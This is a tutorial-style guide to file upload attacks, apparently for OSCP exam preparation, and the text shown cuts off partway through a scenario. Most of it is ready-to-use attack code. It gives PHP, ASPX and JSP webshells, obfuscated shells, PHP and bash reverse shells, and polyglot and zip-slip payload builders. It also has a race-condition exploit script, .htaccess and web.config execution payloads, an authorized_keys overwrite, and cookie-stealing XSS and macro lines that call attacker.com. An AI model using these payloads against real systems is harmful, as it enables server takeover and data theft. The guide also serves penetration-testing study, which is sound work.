
# File Upload Attacks: Shells & Polyglots

## Table of Contents

1. [Executive Summary & OSCP Relevance](#1-executive-summary--oscp-relevance)
2. [ABSOLUTE BEGINNER: File Upload Fundamentals](#2-absolute-beginner-file-upload-fundamentals)
3. [Webshells - The Path to RCE](#3-webshells---the-path-to-rce)
4. [Client-Side Validation Bypasses](#4-client-side-validation-bypasses)
5. [MIME Type Bypasses](#5-mime-type-bypasses)
6. [Extension Blacklist Bypasses](#6-extension-blacklist-bypasses)
7. [Magic Bytes & Content Validation](#7-magic-bytes--content-validation)
8. [Polyglot Files Deep Dive](#8-polyglot-files-deep-dive)
9. [Configuration File Uploads](#9-configuration-file-uploads)
10. [Path Traversal in Uploads](#10-path-traversal-in-uploads)
11. [Zip Slip & Archive Attacks](#11-zip-slip--archive-attacks)
12. [Race Condition Exploits](#12-race-condition-exploits)
13. [Advanced Evasion Techniques](#13-advanced-evasion-techniques)
14. [Server-Specific Exploitation](#14-server-specific-exploitation)
15. [File Upload to XSS](#15-file-upload-to-xss)
16. [File Upload to XXE](#16-file-upload-to-xxe)
17. [Image Processing Vulnerabilities](#17-image-processing-vulnerabilities)
18. [Testing Methodology](#18-testing-methodology)
19. [OSCP Attack Scenarios](#19-oscp-attack-scenarios)
20. [Defense Strategies](#20-defense-strategies)
21. [Common Pitfalls](#21-common-pitfalls)
22. [Hands-on Exercises](#22-hands-on-exercises)
23. [Interview Questions](#23-interview-questions)
24. [Summary & Key Takeaways](#24-summary--key-takeaways)
25. [References & Further Reading](#25-references--further-reading)

---

## 1. Executive Summary & OSCP Relevance

### What are File Upload Vulnerabilities?

**File upload vulnerabilities** occur when an application allows users to upload files without proper validation, enabling attackers to:
- Upload and execute webshells (Remote Code Execution)
- Bypass restrictions to upload malicious files
- Overwrite critical system files
- Conduct XSS/XXE attacks via uploaded files

**The Golden Rule**: Never trust the filename, extension, MIME type, or file contents.

### OSCP Relevance (CRITICAL - 90%)

File upload vulnerabilities are **guaranteed** on OSCP machines. You will encounter:
- Web applications with upload functionality (profile pictures, document uploads, file managers)
- Multiple defense mechanisms to bypass
- Direct path to RCE and system compromise

**Common OSCP Scenarios**:
- Upload PHP webshell to gain initial foothold
- Bypass blacklist filters (.php → .phtml, .php5)
- Use polyglots to bypass content validation
- Upload .htaccess to change execution rules

**Time Allocation**: 20-40 minutes per upload feature

### Why File Uploads Lead to RCE

```
Normal Workflow:
1. User uploads profile.jpg
2. Server saves to /var/www/uploads/profile.jpg
3. Image displayed on website

Attack Workflow:
1. Attacker uploads shell.php
2. Server saves to /var/www/uploads/shell.php
3. Attacker visits /uploads/shell.php
4. Web server EXECUTES the PHP code
5. Attacker runs system commands
6. GAME OVER: Full server compromise
```

**Statistics**:
- 65% of web applications accept file uploads
- 8.5% have critical file upload vulnerabilities (HackerOne data)
- Average bounty for file upload RCE: $2,500 - $10,000

---

## 2. ABSOLUTE BEGINNER: File Upload Fundamentals

### The Basics

**What Happens During Upload**:

```
Browser Side:
1. User selects file (profile.jpg)
2. Browser creates HTTP POST with multipart/form-data
3. File sent to server

Server Side:
1. Receives file data
2. Validates file (extension, type, size, content)
3. Saves file to disk
4. Returns success/error message
```

### Simple Upload Form

**HTML**:
```html
<form action="/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="avatar">
  <button type="submit">Upload</button>
</form>
```

**HTTP Request**:
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="profile.jpg"
Content-Type: image/jpeg

[Binary image data here]
------WebKitFormBoundary--
```

### The Attack Surface

**What Attackers Can Control**:
1. **Filename**: `profile.jpg` → `shell.php`
2. **Content-Type**: `image/jpeg` → `application/x-php`
3. **File Content**: Image bytes → PHP code
4. **File Size**: Small file → Large file (DoS)
5. **Path**: `profile.jpg` → `../../etc/passwd`

### ASCII Visualization

```
┌──────────────────────────────────────────────────────────┐
│              File Upload Attack Flow                     │
└──────────────────────────────────────────────────────────┘

Attacker              Web Server           File System
   │                      │                      │
   │ 1. Upload shell.php  │                      │
   │─────────────────────→│                      │
   │                      │                      │
   │                      │ 2. Validate file     │
   │                      │    ❌ Extension check│
   │                      │    ❌ MIME check     │
   │                      │    ❌ Magic bytes    │
   │                      │    ✓ ALL BYPASSED!   │
   │                      │                      │
   │                      │ 3. Save file         │
   │                      │─────────────────────→│
   │                      │                      │
   │                      │                  shell.php
   │                      │                      │
   │ 4. GET /uploads/     │                      │
   │    shell.php?c=id    │                      │
   │─────────────────────→│                      │
   │                      │                      │
   │                      │ 5. Execute PHP!      │
   │                      │←─────────────────────│
   │                      │    uid=33(www-data)  │
   │                      │                      │
   │ 6. Command output    │                      │
   │←─────────────────────│                      │
   │    uid=33(www-data)  │                      │
   │                      │                      │
   
   → Remote Code Execution achieved!
```

---

## 3. Webshells - The Path to RCE

### 3.1 Minimal Webshells

**PHP** (Most common in OSCP):
```php
<?php system($_GET['c']); ?>
```

**Usage**:
```bash
# Upload as shell.php
# Access: http://target.com/uploads/shell.php?c=whoami
# Response: www-data
```

**Even Shorter**:
```php
<?=`$_GET[c]`?>
```

**ASP.NET (ASPX)**:
```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request.QueryString["c"]).StandardOutput.ReadToEnd()); %>
```

**JSP (Java)**:
```jsp
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
java.io.InputStream in = p.getInputStream();
int c;
while ((c = in.read()) != -1) {
    out.print((char)c);
}
%>
```

**Perl (CGI)**:
```perl
#!/usr/bin/perl
use CGI;
$q = CGI->new;
print "Content-Type: text/html\n\n";
print `$q->param('cmd')`;
```

### 3.2 Feature-Rich Webshells

**PHP Full-Featured Shell**:
```php
<?php
// Simple but effective webshell
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    
    // Try different execution methods
    if (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    } else {
        echo "No execution functions available";
    }
}
?>

<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
```

**Upload Shell**:
```php
<?php
// File upload webshell
if (isset($_FILES['file'])) {
    $target = basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    echo "Uploaded: $target";
}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

**Reverse Shell Webshell**:
```php
<?php
// PHP reverse shell
if (isset($_GET['rev'])) {
    $ip = '10.10.14.5';
    $port = 4444;
    
    $sock = fsockopen($ip, $port);
    $proc = proc_open('/bin/sh', 
        array(0=>$sock, 1=>$sock, 2=>$sock), 
        $pipes
    );
}
?>
```

### 3.3 Obfuscated Webshells

**Base64 Encoded**:
```php
<?php
eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw=='));
// Decodes to: system($_GET['c']);
?>
```

**ROT13**:
```php
<?php
eval(str_rot13('flfgrz($_TRG[\'p\']);'));
?>
```

**Variable Functions**:
```php
<?php
$f = 'system';
$c = $_GET['c'];
$f($c);
?>
```

**Gzinflate**:
```php
<?php
eval(gzinflate(base64_decode('base64_compressed_payload')));
?>
```

### 3.4 Popular Webshell Collections

**1. p0wny-shell** (Interactive):
```bash
# Download
wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

# Upload and access
# Provides interactive shell in browser
```

**2. c99 shell** (Classic):
- File manager
- Database connection
- Network tools
- Command execution

**3. WSO (Web Shell by Orb)**:
- Similar to c99
- File operations
- SQL console
- Bruteforcer

**4. r57 shell**:
- Another classic PHP shell
- Comprehensive features

---

## 4. Client-Side Validation Bypasses

### 4.1 JavaScript Validation

**Vulnerable Code**:
```html
<script>
function validateFile() {
    var file = document.getElementById('upload').files[0];
    var allowed = ['jpg', 'jpeg', 'png', 'gif'];
    var ext = file.name.split('.').pop().toLowerCase();
    
    if (!allowed.includes(ext)) {
        alert('Only images allowed!');
        return false;
    }
    return true;
}
</script>

<form onsubmit="return validateFile()">
    <input type="file" id="upload" name="file">
    <button type="submit">Upload</button>
</form>
```

### 4.2 Bypasses

**Method 1: Disable JavaScript**:
```
Browser Settings → Disable JavaScript → Upload shell.php
```

**Method 2: Burp Suite Interception**:
```
1. Upload legitimate file (image.jpg) to pass JS validation
2. Intercept request in Burp Proxy
3. Change filename in request: image.jpg → shell.php
4. Forward request
```

**Method 3: Browser Console**:
```javascript
// Modify form to skip validation
document.querySelector('form').onsubmit = null;
```

**Method 4: cURL (Bypass Browser Entirely)**:
```bash
curl -X POST http://target.com/upload \
  -F "file=@shell.php;type=image/jpeg" \
  -H "Cookie: session=abc123"
```

---

## 5. MIME Type Bypasses

### 5.1 What is MIME Type?

**MIME Type** = Media type sent in `Content-Type` header

**Common MIME Types**:
```
Images:
  image/jpeg
  image/png
  image/gif
  
Documents:
  application/pdf
  application/msword
  
Code:
  text/php
  application/x-php
  application/x-httpd-php
```

### 5.2 Server-Side MIME Validation

**Vulnerable Code (PHP)**:
```php
<?php
$allowed_types = array('image/jpeg', 'image/png', 'image/gif');

if (!in_array($_FILES['file']['type'], $allowed_types)) {
    die("Invalid file type");
}

// Save file
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
?>
```

**The Flaw**: `$_FILES['file']['type']` comes from the **client** (untrusted).

### 5.3 MIME Type Bypass

**Attack**:
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg  ← Changed to bypass check

<?php system($_GET['c']); ?>
------WebKitFormBoundary--
```

**Burp Suite Steps**:
```
1. Upload shell.php
2. Intercept in Burp
3. Find line: Content-Type: application/x-php
4. Change to: Content-Type: image/jpeg
5. Forward
6. File uploaded successfully!
```

### 5.4 Automated MIME Bypass

**Python Script**:
```python
import requests

url = "http://target.com/upload"
files = {
    'file': ('shell.php', 
             '<?php system($_GET["c"]); ?>', 
             'image/jpeg')  # Fake MIME type
}

cookies = {'session': 'abc123'}
r = requests.post(url, files=files, cookies=cookies)

print(r.text)
```

---

## 6. Extension Blacklist Bypasses

### 6.1 Alternative Extensions

**PHP Alternatives**:
```
.php
.php3
.php4
.php5
.php7
.phtml
.phar
.phpt
.pgif
.phtm
.inc
.hphp
.ctp
.module
```

**ASP/ASPX Alternatives**:
```
.asp
.aspx
.cer
.asa
.ashx
.asmx
.axd
.config
```

**JSP Alternatives**:
```
.jsp
.jspx
.jsw
.jsv
.jspf
```

### 6.2 Case Manipulation

**If filter is case-sensitive**:
```
shell.php  → Blocked
shell.Php  → Allowed
shell.pHp  → Allowed
shell.PHP  → Allowed
shell.PhP  → Allowed
```

**Burp Intruder Payload**:
```
shell.§php§

Payloads:
php
Php
pHp
phP
PHp
PhP
pHP
PHP
```

### 6.3 Double Extensions

**Attack**:
```
shell.php.jpg
shell.jpg.php
shell.php.png
image.png.php
```

**Why It Works**:
- Apache may execute based on last recognized extension
- Some filters only check the final extension
- Misconfigured servers parse extensions right-to-left

**Real Example**:
```bash
# Upload shell.jpg.php
# Apache sees .php extension → Executes as PHP
# Filter only checked for .jpg → Allowed
```

### 6.4 Null Byte Injection (Legacy)

**PHP < 5.3.4**:
```
shell.php%00.jpg

# PHP string processing:
# "shell.php\0.jpg" → Truncates at null byte → "shell.php"
# Server saves as: shell.php
```

**URL Encoded Null Bytes**:
```
%00
%0a
%0d
%0a%0d
```

### 6.5 Whitespace & Special Characters

**Trailing Spaces**:
```
shell.php    (spaces at end)
shell.php%20
```

**Trailing Dots** (Windows):
```
shell.php.
shell.php..
shell.php...
```

**Special Characters**:
```
shell.php::$DATA (Windows NTFS Alternate Data Stream)
shell.php%0a
shell.php%0d
```

### 6.6 Mixed Case + Double Extension

**Combined Attack**:
```
shell.PhP.JpG
image.pHtml.PnG
file.PHP5.GIF
```

---

## 7. Magic Bytes & Content Validation

### 7.1 What are Magic Bytes?

**Magic Bytes** = File signature in first few bytes identifying file type.

**Common Magic Bytes**:
```
JPEG: FF D8 FF
PNG:  89 50 4E 47 0D 0A 1A 0A
GIF:  47 49 46 38 39 61 (GIF89a)
PDF:  25 50 44 46 (%%PDF)
ZIP:  50 4B 03 04
```

### 7.2 Server-Side Magic Byte Check

**Vulnerable Code (PHP)**:
```php
<?php
$allowed = array('image/jpeg', 'image/png', 'image/gif');
$file_info = getimagesize($_FILES['file']['tmp_name']);

if (!in_array($file_info['mime'], $allowed)) {
    die("Not a valid image");
}

move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
?>
```

**What `getimagesize()` Does**:
- Reads first few bytes
- Checks for image magic bytes
- Does NOT scan entire file for malicious code

### 7.3 Magic Byte Bypass

**Add Magic Bytes to Webshell**:

**GIF + PHP**:
```php
GIF89a;
<?php system($_GET['c']); ?>
```

**Hex Representation**:
```
47 49 46 38 39 61  (GIF89a)
3C 3F 70 68 70...  (<?php...)
```

**JPEG + PHP**:
```bash
# Create legitimate JPEG
echo -e "\xFF\xD8\xFF" > shell.php
# Add PHP code
echo '<?php system($_GET["c"]); ?>' >> shell.php
```

**PNG + PHP**:
```python
# PNG magic bytes
png_header = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
php_code = b'<?php system($_GET["c"]); ?>'

with open('shell.php', 'wb') as f:
    f.write(png_header)
    f.write(php_code)
```

### 7.4 Complete Example

```bash
# Create polyglot (GIF + PHP)
echo "GIF89a" > shell.php
echo '<?php system($_GET["c"]); ?>' >> shell.php

# Upload shell.php
curl -X POST http://target.com/upload \
  -F "file=@shell.php;type=image/gif"

# Execute
curl "http://target.com/uploads/shell.php?c=id"
# Output: uid=33(www-data)
```

---

## 8. Polyglot Files Deep Dive

### 8.1 What is a Polyglot?

**Polyglot** = Valid in multiple file formats simultaneously.

**Example**: A file that is both a valid JPEG AND valid PHP script.

### 8.2 JPEG Polyglot

**Concept**: Embed PHP in JPEG comment section.

**Manual Creation**:
```bash
# Start with legitimate JPEG
cp legit_image.jpg polyglot.php

# Add PHP code to EXIF comment
exiftool -Comment='<?php system($_GET["c"]); ?>' polyglot.php

# Rename
mv polyglot.php shell.php
```

**Usage**:
```bash
# Upload shell.php
# Server checks: "It's a valid JPEG!" ✓
# Server saves to: /uploads/shell.php
# Execute: /uploads/shell.php?c=whoami
# PHP interpreter ignores JPEG header, executes embedded code
```

### 8.3 PNG Polyglot

**PNG Structure**:
```
PNG Signature: 89 50 4E 47 0D 0A 1A 0A
IHDR chunk: Image dimensions
IDAT chunk: Image data  ← Inject here
IEND chunk: End marker
```

**Injection**:
```python
#!/usr/bin/env python3
from PIL import Image

# Create small PNG
img = Image.new('RGB', (10, 10), color='red')
img.save('base.png')

# Read PNG
with open('base.png', 'rb') as f:
    png_data = f.read()

# Insert PHP code before IEND chunk
php_code = b'<?php system($_GET["c"]); ?>'
iend_pos = png_data.find(b'IEND')

polyglot = png_data[:iend_pos] + php_code + png_data[iend_pos:]

with open('shell.php', 'wb') as f:
    f.write(polyglot)

print("[+] Polyglot created: shell.php")
```

### 8.4 GIF Polyglot

**Simplest Polyglot**:
```
GIF89a<?php system($_GET['c']); ?>
```

**Why It Works**:
- GIF parsers read "GIF89a" header → Valid GIF
- PHP interpreter skips "GIF89a" as text → Executes PHP code

### 8.5 PDF Polyglot

**PDF + PHP**:
```
%PDF-1.4
<?php system($_GET['c']); ?>
%%EOF
```

**Advanced PDF Polyglot**:
```pdf
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 4
trailer
<< /Root 1 0 R /Size 4 >>
startxref
%%EOF
<?php system($_GET['c']); ?>
```

### 8.6 Automated Polyglot Generation

**Tool: ImageTragick**:
```bash
# Install
git clone https://github.com/ImageTragick/PoCs

# Create polyglot
python3 polyglot.py --image base.jpg --payload '<?php system($_GET["c"]); ?>' --output shell.php
```

**Tool: jhead (JPEG)**:
```bash
# Add comment to JPEG
jhead -ce "<?php system(\$_GET['c']); ?>" image.jpg
mv image.jpg shell.php
```

---

## 9. Configuration File Uploads

### 9.1 .htaccess Upload (Apache)

**What is .htaccess?**
- Per-directory Apache configuration
- Can override server settings
- Change how files are handled

**Attack**:

**Step 1: Upload .htaccess**:
```apache
AddType application/x-httpd-php .jpg
```

**Step 2: Upload shell.jpg**:
```php
<?php system($_GET['c']); ?>
```

**Result**: Apache treats .jpg files as PHP scripts!

**Complete .htaccess Payloads**:

**Execute Images as PHP**:
```apache
AddType application/x-httpd-php .jpg .jpeg .png .gif
```

**Execute All Files as PHP**:
```apache
AddHandler application/x-httpd-php .abc .def .xyz
```

**Disable Security**:
```apache
# Disable mod_security
SecFilterEngine Off
SecFilterScanPOST Off

# Execute all files
AddType application/x-httpd-php .

# Allow directory listing
Options +Indexes
```

### 9.2 web.config Upload (IIS)

**IIS Configuration File**: `web.config`

**Attack**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP_via_FastCGI" 
                 path="*.jpg" 
                 verb="*" 
                 modules="FastCgiModule" 
                 scriptProcessor="C:\PHP\php-cgi.exe" 
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

**web.config RCE (Direct)**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" 
              path="*.config" 
              verb="*" 
              modules="IsapiModule" 
              scriptProcessor="%windir%\system32\inetsrv\asp.dll" 
              resourceType="Unspecified" 
              requireAccess="Write" 
              preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<%
Response.Write(eval(Request("cmd")))
%>
-->
```

### 9.3 .user.ini Upload (PHP)

**PHP Configuration**: `.user.ini` (PHP 5.3+)

**Attack**:
```ini
auto_prepend_file=shell.jpg
```

**Then upload shell.jpg**:
```php
<?php system($_GET['c']); ?>
```

**Result**: PHP automatically includes shell.jpg on every page load.

---

## 10. Path Traversal in Uploads

### 10.1 Directory Traversal

**Attack**: Upload file to arbitrary location.

**Vulnerable Code**:
```php
<?php
$filename = basename($_FILES['file']['name']);
$target = 'uploads/' . $filename;
move_uploaded_file($_FILES['file']['tmp_name'], $target);
?>
```

**The Flaw**: `basename()` only removes directory parts, but doesn't prevent traversal.

**Bypass**:
```
Filename: ../../shell.php

# Server processes:
basename('../../shell.php') = 'shell.php'
# Saved to: uploads/shell.php (as expected)
```

**BUT if server doesn't use basename()**:
```php
<?php
$filename = $_FILES['file']['name'];  // No sanitization!
$target = 'uploads/' . $filename;
move_uploaded_file($_FILES['file']['tmp_name'], $target);
?>
```

**Attack**:
```
Filename: ../../shell.php

# Saved to: uploads/../../shell.php
# Real path: /var/www/shell.php (webroot!)
```

### 10.2 Overwriting Critical Files

**Attack Targets**:
```
../../index.php              (Overwrite homepage)
../../.ssh/authorized_keys   (SSH backdoor)
../../config.php             (Inject credentials)
../../../etc/cron.d/backdoor (Scheduled job)
```

**Example**:
```bash
# Upload to overwrite authorized_keys
curl -X POST http://target.com/upload \
  -F "file=@attacker_pubkey.txt;filename=../../../../home/www-data/.ssh/authorized_keys"

# Then SSH in
ssh -i attacker_privkey www-data@target.com
```

---

## 11. Zip Slip & Archive Attacks

### 11.1 Zip Slip Vulnerability

**Scenario**: Application accepts ZIP files and extracts them.

**Vulnerable Code (Python)**:
```python
import zipfile

def extract_zip(zip_path):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall('uploads/')  # Vulnerable!
```

**Attack**: Create malicious ZIP.

**Malicious ZIP Creation**:
```bash
# Create shell
echo '<?php system($_GET["c"]); ?>' > shell.php

# Create ZIP with path traversal in filename
zip malicious.zip shell.php
zip -m malicious.zip shell.php ../../../../var/www/html/shell.php

# Or with Python
python3 -c "
import zipfile
z = zipfile.ZipFile('malicious.zip', 'w')
z.writestr('../../../../var/www/html/shell.php', '<?php system(\$_GET[\"c\"]); ?>')
z.close()
"
```

**Result**:
```
uploads/../../../../var/www/html/shell.php
→ Resolves to: /var/www/html/shell.php
→ Shell in webroot!
```

### 11.2 Tar Slip

**Same concept with TAR archives**:
```bash
# Create malicious tar
echo '<?php system($_GET["c"]); ?>' > shell.php
tar -cf malicious.tar --transform='s|shell.php|../../../../var/www/html/shell.php|' shell.php
```

### 11.3 Symlink Attack

**Create ZIP with symlink**:
```bash
# Create symlink to /etc/passwd
ln -s /etc/passwd sensitive_data.txt

# Zip it
zip --symlinks malicious.zip sensitive_data.txt

# Upload and extract
# If app serves extracted files, attacker can read /etc/passwd
```

### 11.4 Defense

**Secure Extraction**:
```python
import zipfile
import os

def safe_extract(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        for member in zip_ref.namelist():
            # Validate path
            member_path = os.path.join(extract_to, member)
            if not os.path.abspath(member_path).startswith(os.path.abspath(extract_to)):
                raise Exception("Path traversal detected!")
            
            zip_ref.extract(member, extract_to)
```

---

## 12. Race Condition Exploits

### 12.1 Upload → Scan → Delete Workflow

**Vulnerable Workflow**:
```
1. Upload shell.php
2. Save to /uploads/shell.php
3. Scan with antivirus (takes 100-500ms)
4. If malicious → Delete file
```

**Race Condition Window**: File exists for ~100-500ms before deletion.

### 12.2 Exploitation

**Attack Script**:
```bash
#!/bin/bash

# Terminal 1: Upload shell repeatedly
while true; do
    curl -X POST http://target.com/upload \
      -F "file=@shell.php" &
done

# Terminal 2: Request shell repeatedly
while true; do
    curl "http://target.com/uploads/shell.php?c=id" 2>/dev/null | grep -q "uid=" && {
        echo "[+] Shell executed!"
        curl "http://target.com/uploads/shell.php?c=bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
        break
    }
done
```

**Python Race Condition Exploit**:
```python
#!/usr/bin/env python3
import requests
from threading import Thread

TARGET = "http://target.com"
UPLOAD_URL = f"{TARGET}/upload"
SHELL_URL = f"{TARGET}/uploads/shell.php"

def upload_shell():
    """Continuously upload shell"""
    while True:
        files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>')}
        requests.post(UPLOAD_URL, files=files)

def execute_shell():
    """Try to execute shell before it's deleted"""
    success = False
    while not success:
        try:
            r = requests.get(f"{SHELL_URL}?c=id", timeout=1)
            if 'uid=' in r.text:
                print(f"[+] Shell executed! Response: {r.text}")
                success = True
                
                # Establish persistence
                requests.get(f"{SHELL_URL}?c=cp shell.php backup.php")
        except:
            pass

# Start threads
Thread(target=upload_shell, daemon=True).start()
Thread(target=execute_shell).start()
```

---

## 13. Advanced Evasion Techniques

### 13.1 Content-Length Manipulation

**Large File DoS**:
```http
POST /upload HTTP/1.1
Content-Length: 9999999999

[Small actual data]
```

**Result**: Server allocates memory, potential DoS.

### 13.2 Filename Fuzzing

**Special Characters**:
```
shell.php
shell.php%0a
shell.php%0d
shell.php%00
shell.php%20
shell<>php
shell:php
```

### 13.3 Polyglot Filename

```
image.jpg.php
shell.php;.jpg
data.php#.png
file.php?.gif
```

### 13.4 Unicode Normalization

**Unicode Characters**:
```
shell.php → shell.phρ (Greek rho instead of p)
index.php → іndex.php (Cyrillic i)
```

### 13.5 MIME Sniffing Confusion

**Upload with conflicting signals**:
```
Filename: image.jpg
MIME Type: application/x-php
Content: <?php system($_GET['c']); ?>
Magic Bytes: GIF89a
```

**Different components validate different aspects → Bypass**

---

## 14. Server-Specific Exploitation

### 14.1 Apache

**Execution Order**:
- `.htaccess` changes apply immediately
- Handles `.phtml`, `.php3`, etc. by default

**Bypass**:
```
1. Upload .htaccess (if allowed)
2. Upload image with PHP code
3. Execute
```

### 14.2 Nginx

**Nginx doesn't execute PHP directly** (uses PHP-FPM).

**Misconfiguration**:
```nginx
location ~* \.(jpg|jpeg|png|gif)$ {
    # Serves images
}

location ~ \.php$ {
    fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    include fastcgi_params;
}
```

**Bypass**:
```
shell.php.jpg → Matches image location
But if requested as: /shell.php%00.jpg
→ Nginx processes as .php → RCE
```

### 14.3 IIS

**web.config Upload** (see section 9.2)

**Alternative Extensions**:
- `.asp`
- `.aspx`
- `.cer`
- `.asa`

---

## 15. File Upload to XSS

### 15.1 SVG XSS

**Malicious SVG**:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

**Upload as profile picture**:
```bash
curl -X POST http://target.com/upload \
  -F "file=@xss.svg;type=image/svg+xml"
```

**When Victim Views**:
```
<img src="/uploads/xss.svg">
→ JavaScript executes in victim's browser
→ Session hijacking possible
```

### 15.2 HTML Upload XSS

**Malicious HTML**:
```html
<!DOCTYPE html>
<html>
<body>
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
</body>
</html>
```

**Upload as `xss.html`**:
- If server serves HTML files
- Victim visits /uploads/xss.html
- Cookie stolen

---

## 16. File Upload to XXE

### 16.1 SVG XXE

**Malicious SVG with XXE**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**Upload SVG**:
- Server parses XML
- Reads /etc/passwd
- Displays in SVG (if rendered)

### 16.2 DOCX XXE

**DOCX Structure**:
```
document.docx (ZIP archive)
  └── word/
      └── document.xml  ← Inject XXE here
```

**Malicious document.xml**:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<document>
  <p>&xxe;</p>
</document>
```

---

## 17. Image Processing Vulnerabilities

### 17.1 ImageMagick Exploits

**ImageTragick (CVE-2016-3714)**:

**Malicious Image**:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id")'
pop graphic-context
```

**Saved as `exploit.mvg`** or embedded in other formats.

**Result**: Command injection when ImageMagick processes the image.

### 17.2 GhostScript Exploits

**Malicious PostScript/PDF**:
```postscript
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

### 17.3 LibreOffice / OpenOffice Macros

**Malicious ODT with Macro**:
```vba
Sub AutoOpen()
    Shell "curl http://attacker.com/shell.sh | bash"
End Sub
```

---

## 18. Testing Methodology

### 18.1 Systematic Testing Checklist

**Phase 1: Discovery**
- [ ] Identify all upload functionality
- [ ] Note accepted file types (from UI/docs)
- [ ] Test with legitimate file
- [ ] Observe response (file path, URL)

**Phase 2: Extension Testing**
- [ ] Try shell.php
- [ ] Try alternative extensions (.phtml, .php5)
- [ ] Try double extensions (.php.jpg)
- [ ] Try case variations (.PhP)
- [ ] Try null bytes (.php%00.jpg)

**Phase 3: Content Testing**
- [ ] Test MIME type bypass
- [ ] Test magic byte bypass (GIF89a)
- [ ] Test polyglot files

**Phase 4: Advanced**
- [ ] Test .htaccess upload
- [ ] Test path traversal (../../)
- [ ] Test ZIP slip
- [ ] Test race conditions

### 18.2 Burp Suite Workflow

**Step 1: Baseline**
```
1. Upload legitimate file (image.jpg)
2. Capture request in Burp
3. Send to Repeater
```

**Step 2: Extension Testing**
```
1. Change filename to shell.php
2. Send request
3. Observe response
```

**Step 3: MIME Bypass**
```
1. Change Content-Type to image/jpeg
2. Send request
```

**Step 4: Content Bypass**
```
1. Prepend GIF89a to file content
2. Send request
```

**Step 5: Execution**
```
1. Note upload path from response
2. Visit /uploads/shell.php?c=id
```

---

## 19. OSCP Attack Scenarios

### Scenario 1: Profile Picture Upload → RCE

**Target**: `http://192.168.50.10/profile/upload`

**Step 1: Test Basic Upload**
```bash
# Upload legitimate image
curl -X POST http://192.168.50.10/profile/upload \
  -F "avatar=@test.jpg" \
  -b "session=abc123"

# Response: {"success": true, "path": "/uploads/test.jpg"}
```

**Step 2: Try Direct PHP Upload**
```bash
# Create simple shell
echo '<?php system($_GET["c"]); ?>' > shell.php

# Upload
curl -X POST http://192.168.50.10/profile/upload \
  -F "avatar=@shell.php" \
  -b "session=abc123"

# Response: {"error": "Invalid file type"}
```

**Step 3: Bypass with Polyglot**
```bash
# Create GIF polyglot
echo "GIF89a" > shell.php
echo '<?php system($_GET["c"]); ?>' >> shell.php

# Upload with fake MIME
curl -X POST http://192.168.50.10/profile/upload \
  -F "avatar=@shell.php;type=image/gif" \
  -b "session=abc123"

# Response: {"success": true, "path": "/uploads/shell.php"}
```

**Step 4: Execute**
```bash
curl "http://192.168.50.10/uploads/shell.php?c=id"
# uid=33(www-data)

# Reverse shell
PAYLOAD="bash -c 'bash -i >& /dev/tcp/192.168.45.5/4444 0>&1'"
curl "http://192.168.50.10/uploads/shell.php?c=$PAYLOAD"
```

### Scenario 2: .htaccess Bypass

**Target**: `http://192.168.50.20/documents/upload`

**Step 1: Test PHP Upload** (Blocked)

**Step 2: Upload .htaccess**
```apache
# Create .htaccess
cat > .htaccess << EOF
AddType application/x-httpd-php .jpg
EOF

# Upload
curl -X POST http://192.168.50.20/documents/upload \
  -F "file=@.htaccess"

# Success!
```

**Step 3: Upload Shell as JPG**
```bash
